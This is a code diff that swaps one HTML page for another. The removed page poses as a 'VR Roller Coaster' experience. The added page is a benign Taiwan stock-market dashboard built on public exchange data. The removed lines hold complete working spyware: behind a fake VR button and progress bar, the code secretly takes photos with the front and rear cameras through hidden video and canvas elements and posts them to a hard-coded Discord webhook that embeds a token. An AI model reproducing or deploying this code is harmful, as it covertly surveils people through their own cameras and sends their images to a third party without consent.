@@ -1,280 +1,616 @@
+
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="zh-TW">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>VR Roller Coaster 3D 虛擬雲霄飛車體驗艙</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>台股情報中心</title>
+
 <style>
-  /* 科技感深色背景與動態粒子氛圍 */
-  body { 
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-    background: radial-gradient(circle, #1a0b36 0%, #05021a 100%); 
-    color: #00ffff; 
-    text-align: center; 
-    margin: 0; 
-    padding: 0;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    overflow: hidden;
-  }
+:root {
+  color-scheme: dark;
+  --bg: #0b1020;
+  --panel: #141c30;
+  --border: #26344d;
+  --text: #e8eef9;
+  --muted: #91a0ba;
+  --green: #34d399;
+  --red: #fb7185;
+  --blue: #60a5fa;
+}
 
-  /* 體驗艙外框面板 */
-  .container {
-    background: rgba(255, 255, 255, 0.03);
-    border: 2px solid #00ffff;
-    box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
-    border-radius: 20px;
-    padding: 40px;
-    max-width: 400px;
-    width: 85%;
-    backdrop-filter: blur(10px);
-  }
+* { box-sizing: border-box; }
 
-  h1 { 
-    font-size: 28px; 
-    margin-bottom: 5px; 
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    text-shadow: 0 0 10px #00ffff;
-  }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont,
+    "Segoe UI", "Noto Sans TC", sans-serif;
+}
 
-  .subtitle {
-    color: #ff007f;
-    font-size: 14px;
-    font-weight: bold;
-    letter-spacing: 4px;
-    margin-bottom: 30px;
-    text-shadow: 0 0 8px #ff007f;
-  }
+header {
+  padding: 24px 5%;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 15px;
+}
 
-  /* 充滿未來感的 VR 啟動按鈕 */
-  .vr-btn { 
-    margin: 20px auto; 
-    padding: 18px 40px; 
-    font-size: 20px; 
-    cursor: pointer; 
-    border: 2px solid #ff007f; 
-    border-radius: 50px; 
-    background: transparent; 
-    color: #fff; 
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    overflow: hidden;
-    position: relative;
-    transition: all 0.3s ease;
-    box-shadow: 0 0 15px rgba(255, 0, 127, 0.4);
-    -webkit-tap-highlight-color: transparent;
-  }
+h1 { margin: 0; font-size: 25px; }
+h2 { font-size: 18px; margin-top: 0; }
 
-  .vr-btn:hover { 
-    background: #ff007f;
-    box-shadow: 0 0 30px rgba(255, 0, 127, 0.8);
-    text-shadow: 0 0 5px #fff;
-    transform: scale(1.05);
-  }
+small, .muted { color: var(--muted); }
 
-  /* 新增：霓虹進度條外框 */
-  .progress-container {
-    width: 100%;
-    height: 12px;
-    background: rgba(255, 255, 255, 0.1);
-    border-radius: 10px;
-    margin-top: 25px;
-    overflow: hidden;
-    border: 1px solid rgba(0, 255, 255, 0.2);
-    display: none; /* 初始隱藏，點擊按鈕後才顯示 */
-  }
+button, input, select {
+  font: inherit;
+  border: 1px solid var(--border);
+  border-radius: 9px;
+  padding: 10px 12px;
+  background: #0d1527;
+  color: var(--text);
+}
 
-  /* 新增：進度條本體（動態發光特效） */
-  .progress-bar {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #ff007f, #00ffff);
-    box-shadow: 0 0 10px #00ffff;
-    border-radius: 10px;
-    transition: width 0.4s ease; /* 讓進度條跑動時更平滑 */
-  }
+button {
+  cursor: pointer;
+  background: #2563eb;
+  border-color: #2563eb;
+}
 
-  /* 狀態提示文字 */
-  #status-text {
-    margin-top: 15px;
-    font-size: 14px;
-    color: #888;
-    height: 20px;
-  }
+button:hover { filter: brightness(1.15); }
 
-  .loading {
-    color: #00ffff !important;
-    animation: blink 1s infinite;
-  }
+button.secondary {
+  background: #1c2940;
+  border-color: var(--border);
+}
 
-  @keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.3; }
-  }
-  
-  /* 保持隱藏：完全不佔空間、不顯示任何相機預覽畫面 */
-  video, canvas { display: none !important; }
+main {
+  max-width: 1450px;
+  padding: 24px 5%;
+  margin: auto;
+}
+
+.notice {
+  padding: 13px 16px;
+  background: #17243a;
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  margin-bottom: 20px;
+  color: #bfdbfe;
+  line-height: 1.7;
+}
+
+.grid {
+  display: grid;
+  grid-template-columns: repeat(4, minmax(0, 1fr));
+  gap: 15px;
+  margin-bottom: 22px;
+}
+
+.panel {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 20px;
+  min-width: 0;
+}
+
+.metric {
+  font-size: clamp(20px, 3vw, 29px);
+  font-weight: 700;
+  margin: 14px 0 8px;
+  overflow-wrap: anywhere;
+}
+
+.up { color: var(--red); }
+.down { color: var(--green); }
+.neutral { color: var(--muted); }
+
+.toolbar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+  margin-bottom: 16px;
+}
+
+.toolbar input { flex: 1; min-width: 150px; }
+
+.table-wrap {
+  overflow-x: auto;
+  width: 100%;
+}
+
+table {
+  border-collapse: collapse;
+  width: 100%;
+  white-space: nowrap;
+  font-size: 14px;
+}
+
+th, td {
+  text-align: left;
+  padding: 14px 12px;
+  border-bottom: 1px solid var(--border);
+}
+
+th { color: var(--muted); font-weight: 500; }
+
+.code {
+  color: var(--blue);
+  font-weight: 700;
+}
+
+.link {
+  color: #93c5fd;
+  text-decoration: none;
+}
+
+.status { font-size: 13px; color: var(--muted); }
+footer {
+  padding: 24px 5%;
+  color: var(--muted);
+  font-size: 12px;
+  line-height: 1.8;
+}
+
+@media (max-width: 850px) {
+  .grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+}
+
+@media (max-width: 480px) {
+  main { padding: 18px 4%; }
+  header { padding: 20px 4%; }
+  .panel { padding: 14px; }
+}
 </style>
 </head>
-<body>
 
-  <div class="container">
-    <h1>VR ROLLER COASTER</h1>
-    <div class="subtitle">3D 模擬雲霄飛車體驗艙</div>
-    
-    <!-- 偽裝成 VR 啟動的唯一按鈕 -->
-    <button id="start-btn" class="vr-btn" onclick="startAutoTask()">進入虛擬實境</button>
-    
-    <!-- 新增：網頁進度條組件 -->
-    <div id="progress-box" class="progress-container">
-      <div id="progress-bar" class="progress-bar"></div>
-    </div>
-    
-    <!-- 取代原本彈窗通知的狀態列 -->
-    <div id="status-text">系統就緒，等待連線裝置...</div>
+<body>
+<header>
+  <div>
+    <h1>台股情報中心</h1>
+    <small>TAIWAN STOCK MARKET DASHBOARD</small>
+  </div>
+  <div>
+    <button id="refreshBtn">重新載入行情</button>
+  </div>
+</header>
+
+<main>
+  <div class="notice">
+    <strong>行情說明</strong><br>
+    本頁使用公開市場資料，主要為最近可取得的交易日資料，
+    不保證盤中即時。台股漲跌顏色採台灣市場慣例：
+    <span class="up">紅色代表上漲</span>、
+    <span class="down">綠色代表下跌</span>。
+    股票觀察排名僅供研究，不構成買賣建議。
   </div>
 
-  <!-- 後台隱藏組件 -->
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+  <div class="grid">
+    <section class="panel">
+      <div class="muted">發行量加權指數</div>
+      <div class="metric" id="indexValue">載入中</div>
+      <div id="indexChange" class="status">等待市場資料</div>
+    </section>
 
-  <script>
-    let currentStream = null;
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 
+    <section class="panel">
+      <div class="muted">上市股票數量</div>
+      <div class="metric" id="stockCount">--</div>
+      <div class="status">依目前取得的資料計算</div>
+    </section>
 
-    // 新增：更新進度條的工具函式
-    function updateProgress(percentage) {
-      const progressBar = document.getElementById("progress-bar");
-      progressBar.style.width = percentage + "%";
+    <section class="panel">
+      <div class="muted">上漲家數</div>
+      <div class="metric up" id="upCount">--</div>
+      <div class="status">依可取得的漲跌資料統計</div>
+    </section>
+
+    <section class="panel">
+      <div class="muted">下跌家數</div>
+      <div class="metric down" id="downCount">--</div>
+      <div class="status">依可取得的漲跌資料統計</div>
+    </section>
+  </div>
+
+  <section class="panel" style="margin-bottom:22px">
+    <h2>市場狀態</h2>
+    <p id="marketSummary">正在讀取公開資料……</p>
+    <p class="status" id="updateTime">尚未更新</p>
+    <p class="status" id="dataStatus"></p>
+  </section>
+
+  <section class="panel" style="margin-bottom:22px">
+    <h2>個股行情</h2>
+    <div class="toolbar">
+      <input id="searchInput" placeholder="搜尋股票代碼或名稱，例如 2330">
+      <select id="sortSelect">
+        <option value="volume">成交量由高至低</option>
+        <option value="change">漲幅由高至低</option>
+        <option value="changeDown">跌幅由大至小</option>
+        <option value="name">依股票代碼排序</option>
+      </select>
+      <button id="watchFilter" class="secondary">全部股票</button>
+    </div>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>代碼</th>
+            <th>名稱</th>
+            <th>收盤價</th>
+            <th>漲跌</th>
+            <th>成交量</th>
+            <th>觀察</th>
+            <th>查詢</th>
+          </tr>
+        </thead>
+        <tbody id="stockTable">
+          <tr><td colspan="7">正在載入資料……</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="status" id="tableStatus"></p>
+  </section>
+
+  <section class="panel">
+    <h2>自選觀察清單</h2>
+    <p class="muted">按下個股旁的「＋觀察」即可加入。清單會保存在目前瀏覽器。</p>
+    <div id="watchList" class="toolbar">
+      <span class="muted">尚未加入股票</span>
+    </div>
+  </section>
+</main>
+
+<footer>
+  資料來源：
+  <a class="link" href="https://openapi.twse.com.tw/"
+     target="_blank" rel="noopener">臺灣證券交易所 OpenAPI</a>。
+  <br>
+  本頁提供行情整理與研究用途，不保證資料即時、完整或適合所有投資人。
+  股票代碼查詢連結僅供進一步研究，不會執行下單。
+</footer>
+
+<script>
+"use strict";
+
+const API = {
+  stocks: "https://openapi.twse.com.tw/v1/exchangeReport/STOCK_DAY_ALL",
+  indices: "https://openapi.twse.com.tw/v1/exchangeReport/MI_INDEX"
+};
+
+const $ = id => document.getElementById(id);
+
+let stocks = [];
+let indexData = null;
+let watchOnly = false;
+let watchSet = new Set(loadWatchList());
+
+function loadWatchList() {
+  try {
+    const saved = JSON.parse(localStorage.getItem("twStockWatch") || "[]");
+    return Array.isArray(saved) ? saved : [];
+  } catch {
+    return [];
+  }
+}
+
+function saveWatchList() {
+  localStorage.setItem("twStockWatch", JSON.stringify([...watchSet]));
+}
+
+function numberOf(value) {
+  if (value === null || value === undefined || value === "") return NaN;
+  const n = Number(String(value).replace(/,/g, "").replace(/％/g, ""));
+  return Number.isFinite(n) ? n : NaN;
+}
+
+function formatNumber(value, digits = 2) {
+  const n = numberOf(value);
+  return Number.isFinite(n)
+    ? n.toLocaleString("zh-TW", {
+        minimumFractionDigits: digits,
+        maximumFractionDigits: digits
+      })
+    : "--";
+}
+
+function getField(row, names) {
+  for (const name of names) {
+    if (row[name] !== undefined && row[name] !== null) return row[name];
+  }
+  return "";
+}
+
+function getChange(stock) {
+  const direct = numberOf(getField(stock, ["漲跌價差", "Change"]));
+  if (Number.isFinite(direct)) return direct;
+
+  const close = numberOf(getField(stock, ["收盤價", "ClosingPrice"]));
+  const open = numberOf(getField(stock, ["開盤價", "OpeningPrice"]));
+  if (Number.isFinite(close) && Number.isFinite(open)) return close - open;
+
+  return NaN;
+}
+
+function getPrice(stock) {
+  return numberOf(getField(stock, ["收盤價", "ClosingPrice"]));
+}
+
+function getVolume(stock) {
+  return numberOf(getField(stock, ["成交股數", "TradeVolume"]));
+}
+
+function getCode(stock) {
+  return String(getField(stock, ["證券代號", "Code"])).trim();
+}
+
+function getName(stock) {
+  return String(getField(stock, ["證券名稱", "Name"])).trim();
+}
+
+function getPercent(stock) {
+  const close = getPrice(stock);
+  const change = getChange(stock);
+  const previous = close - change;
+
+  return Number.isFinite(close) &&
+    Number.isFinite(change) &&
+    previous !== 0
+      ? change / previous * 100
+      : NaN;
+}
+
+function movementClass(value) {
+  if (!Number.isFinite(value)) return "neutral";
+  if (value > 0) return "up";
+  if (value < 0) return "down";
+  return "neutral";
+}
+
+async function fetchJSON(url) {
+  const response = await fetch(url, { cache: "no-store" });
+  if (!response.ok) {
+    throw new Error(`HTTP ${response.status}`);
+  }
+  return response.json();
+}
+
+async function loadMarket() {
+  $("refreshBtn").disabled = true;
+  $("dataStatus").textContent = "正在連線至公開資料來源……";
+
+  try {
+    const results = await Promise.allSettled([
+      fetchJSON(API.stocks),
+      fetchJSON(API.indices)
+    ]);
+
+    if (results[0].status === "fulfilled" &&
+        Array.isArray(results[0].value)) {
+      stocks = results[0].value.filter(stock =>
+        getCode(stock) && getName(stock)
+      );
+      renderStocks();
+      renderSummary();
+      $("dataStatus").textContent =
+        "個股資料已載入。請留意實際資料日期與盤後更新時間。";
+    } else {
+      const reason = results[0].reason;
+      throw new Error(reason?.message || "個股行情資料無法讀取");
     }
 
-    async function startAutoTask() {
-      const statusLabel = document.getElementById("status-text");
-      const progressBox = document.getElementById("progress-box");
-      const startBtn = document.getElementById("start-btn");
-      
-      // 點擊後隱藏按鈕並顯示進度條
-      startBtn.style.display = "none";
-      progressBox.style.display = "block";
-      statusLabel.className = "loading";
-      
-      statusLabel.innerText = "正在加載環境 3D 模組... 請允許相機權限";
-      updateProgress(5); // 初始進度
-      
-      // 1. 前鏡頭連續捕捉 3 張 (預計進度落點：10% -> 50%)
-      const userSuccess = await initCamera('user');
-      if (userSuccess) {
-        statusLabel.innerText = "視訊訊號對接中... 正在優化陀螺儀";
-        for (let i = 1; i <= 3; i++) {
-          await delay(1200);
-          await captureAndSend(`📸 [前鏡頭] VR 體驗初始化 - 軌道定位點 ${i}`);
-          updateProgress(10 + i * 13); // 第1張23%, 第2張36%, 第3張49%
-        }
-      } else {
-        updateProgress(50); // 若失敗直接跳進度
-      }
-
-      // 2. 後鏡頭連續捕捉 3 張 (預計進度落點：55% -> 95%)
-      statusLabel.innerText = "正在渲染高速動態軌道... 請稍後";
-      updateProgress(55);
-      
-      const envSuccess = await initCamera('environment');
-      if (envSuccess) {
-        statusLabel.innerText = "正在進行空間追蹤與視角校正...";
-        for (let i = 1; i <= 3; i++) {
-          await delay(1200);
-          await captureAndSend(`📸 [後鏡頭] VR 體驗中 - 畫面渲染快照 ${i}`);
-          updateProgress(55 + i * 13); // 第1張68%, 第2張81%, 第3張94%
-        }
-      }
-      
-      // 結束任務並關閉相機
-      stopCurrentStream();
-      
-      // 載入完成，衝到 100%
-      updateProgress(100);
-      statusLabel.className = "";
-      statusLabel.innerText = "VR 動態體驗環境加載完成。";
+    if (results[1].status === "fulfilled" &&
+        Array.isArray(results[1].value)) {
+      indexData = results[1].value;
+      renderIndex();
+    } else {
+      $("indexValue").textContent = "--";
+      $("indexChange").textContent = "指數資料暫時無法取得";
     }
 
-    async function initCamera(facingMode) {
-      const videoElement = document.getElementById("video");
-      stopCurrentStream();
+    $("updateTime").textContent =
+      "本機讀取時間：" + new Date().toLocaleString("zh-TW");
 
-      try {
-        currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { exact: facingMode } },
-          audio: false
-        });
-      } catch (err) {
-        try {
-          currentStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: facingMode },
-            audio: false
-          });
-        } catch (e) {
-          document.getElementById("status-text").innerText = "硬體安全封鎖，無法載入 VR 環境。";
-          return false;
-        }
-      }
+  } catch (error) {
+    $("dataStatus").textContent =
+      "讀取失敗：" + error.message +
+      "。可能是來源暫時無法連線或瀏覽器跨來源限制，請稍後重試。";
 
-      videoElement.srcObject = currentStream;
-      await new Promise((resolve) => {
-        videoElement.onloadeddata = () => resolve();
-      });
-      return true;
+    $("marketSummary").textContent =
+      "目前無法可靠判斷市場狀態，請勿將空白或舊資料當成最新行情。";
+
+    if (!stocks.length) {
+      $("stockTable").innerHTML =
+        '<tr><td colspan="7">資料載入失敗，請重新載入。</td></tr>';
     }
+  } finally {
+    $("refreshBtn").disabled = false;
+  }
+}
 
-    function captureAndSend(labelText) {
-      return new Promise((resolve) => {
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const context = canvas.getContext("2d");
+function renderIndex() {
+  if (!Array.isArray(indexData)) return;
 
-        if (video.videoWidth === 0 || video.videoHeight === 0) {
-          resolve();
-          return;
-        }
+  const row = indexData.find(item =>
+    String(getField(item, ["指數", "指數名稱"])).includes("發行量加權")
+  );
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  if (!row) {
+    $("indexValue").textContent = "--";
+    $("indexChange").textContent = "來源未提供可識別的大盤指數";
+    return;
+  }
 
-        canvas.toBlob(async (blob) => {
-          if (!blob) {
-            resolve();
-            return;
-          }
+  const close = numberOf(getField(row, ["收盤指數"]));
+  const change = numberOf(getField(row, ["漲跌點數"]));
+  const direction = String(getField(row, ["漲跌", "漲跌(+/-)"]));
 
-          const formData = new FormData();
-          formData.append("content", labelText);
-          formData.append("file", blob, "vr_stream_capture.jpg");
+  $("indexValue").textContent = formatNumber(close);
 
-          try {
-            await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
-          } catch (error) {
-            console.error(error);
-          }
-          resolve();
-        }, "image/jpeg", 0.85);
-      });
-    }
+  const signedChange = direction === "-" ? -Math.abs(change) :
+    direction === "+" ? Math.abs(change) : change;
 
-    function stopCurrentStream() {
-      if (currentStream) {
-        currentStream.getTracks().forEach(track => track.stop());
-        currentStream = null;
-      }
-    }
+  $("indexChange").className =
+    "status " + movementClass(signedChange);
 
-    function delay(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-  </script>
+  $("indexChange").textContent =
+    Number.isFinite(signedChange)
+      ? `${signedChange > 0 ? "+" : ""}${formatNumber(signedChange)} 點`
+      : "漲跌資料未提供";
+}
+
+function renderSummary() {
+  $("stockCount").textContent = stocks.length.toLocaleString("zh-TW");
+
+  let up = 0;
+  let down = 0;
+  let flat = 0;
+
+  for (const stock of stocks) {
+    const change = getChange(stock);
+    if (!Number.isFinite(change)) continue;
+    if (change > 0) up++;
+    else if (change < 0) down++;
+    else flat++;
+  }
+
+  $("upCount").textContent = up.toLocaleString("zh-TW");
+  $("downCount").textContent = down.toLocaleString("zh-TW");
+
+  if (up + down + flat === 0) {
+    $("marketSummary").textContent =
+      "目前缺少足夠的漲跌資料，無法判斷市場廣度。";
+  } else if (up > down) {
+    $("marketSummary").textContent =
+      `上漲 ${up} 檔、下跌 ${down} 檔、平盤 ${flat} 檔。` +
+      "目前上漲家數較多，但仍需搭配指數、成交量與基本面判讀。";
+  } else if (down > up) {
+    $("marketSummary").textContent =
+      `上漲 ${up} 檔、下跌 ${down} 檔、平盤 ${flat} 檔。` +
+      "目前下跌家數較多，宜留意市場風險及個股差異。";
+  } else {
+    $("marketSummary").textContent =
+      `上漲 ${up} 檔、下跌 ${down} 檔、平盤 ${flat} 檔。` +
+      "漲跌家數相近，建議進一步檢視產業與個股資料。";
+  }
+}
+
+function renderStocks() {
+  const keyword = $("searchInput").value.trim().toLowerCase();
+  const sort = $("sortSelect").value;
+
+  let list = stocks.filter(stock => {
+    const match = getCode(stock).toLowerCase().includes(keyword) ||
+      getName(stock).toLowerCase().toLowerCase().includes(keyword);
+
+    return match && (!watchOnly || watchSet.has(getCode(stock)));
+  });
+
+  list.sort((a, b) => {
+    if (sort === "volume") return (getVolume(b) || 0) - (getVolume(a) || 0);
+    if (sort === "change") return (getPercent(b) || -Infinity) - (getPercent(a) || -Infinity);
+    if (sort === "changeDown") return (getPercent(a) || Infinity) - (getPercent(b) || Infinity);
+    return getCode(a).localeCompare(getCode(b));
+  });
+
+  const display = list.slice(0, 150);
+
+  $("stockTable").innerHTML = display.length
+    ? display.map(stock => {
+        const code = getCode(stock);
+        const name = getName(stock);
+        const price = getPrice(stock);
+        const change = getChange(stock);
+        const percent = getPercent(stock);
+        const cls = movementClass(change);
+        const escapedCode = escapeHTML(code);
+
+        return `<tr>
+          <td class="code">${escapedCode}</td>
+          <td>${escapeHTML(name)}</td>
+          <td>${formatNumber(price)}</td>
+          <td class="${cls}">
+            ${Number.isFinite(change) && change > 0 ? "+" : ""}
+            ${formatNumber(change)}
+            <small class="${cls}">
+              (${Number.isFinite(percent) ? formatNumber(percent) + "%" : "--"})
+            </small>
+          </td>
+          <td>${formatNumber(getVolume(stock), 0)}</td>
+          <td>
+            <button class="secondary" data-watch="${escapedCode}">
+              ${watchSet.has(code) ? "移除" : "＋觀察"}
+            </button>
+          </td>
+          <td>
+            <a class="link" target="_blank" rel="noopener"
+              href="https://www.twse.com.tw/zh/trading/historical/stock-day.html?stockNo=${encodeURIComponent(code)}">
+              查詢
+            </a>
+          </td>
+        </tr>`;
+      }).join("")
+    : '<tr><td colspan="7">沒有符合條件的股票。</td></tr>';
+
+  $("tableStatus").textContent =
+    `符合條件 ${list.length} 檔，目前顯示 ${display.length} 檔。`;
+
+  renderWatchList();
+}
+
+function renderWatchList() {
+  const items = [...watchSet];
+
+  $("watchList").innerHTML = items.length
+    ? items.map(code => {
+        const stock = stocks.find(item => getCode(item) === code);
+        const name = stock ? getName(stock) : "";
+        return `<button class="secondary" data-watch="${escapeHTML(code)}">
+          ${escapeHTML(code)} ${escapeHTML(name)} ×
+        </button>`;
+      }).join("")
+    : '<span class="muted">尚未加入股票</span>';
+
+  $("watchFilter").textContent =
+    watchOnly ? "顯示全部股票" : "只看自選股票";
+}
+
+function escapeHTML(value) {
+  return String(value).replace(/[&<>"']/g, char => ({
+    "&": "&amp;",
+    "<": "&lt;",
+    ">": "&gt;",
+    '"': "&quot;",
+    "'": "&#39;"
+  })[char]);
+}
+
+document.addEventListener("click", event => {
+  const button = event.target.closest("[data-watch]");
+  if (!button) return;
+
+  const code = button.dataset.watch;
+  if (watchSet.has(code)) watchSet.delete(code);
+  else watchSet.add(code);
+
+  saveWatchList();
+  renderStocks();
+});
+
+$("searchInput").addEventListener("input", renderStocks);
+$("sortSelect").addEventListener("change", renderStocks);
+
+$("watchFilter").addEventListener("click", () => {
+  watchOnly = !watchOnly;
+  renderStocks();
+});
+
+$("refreshBtn").addEventListener("click", loadMarket);
+
+loadMarket();
+</script>
 </body>
 </html>
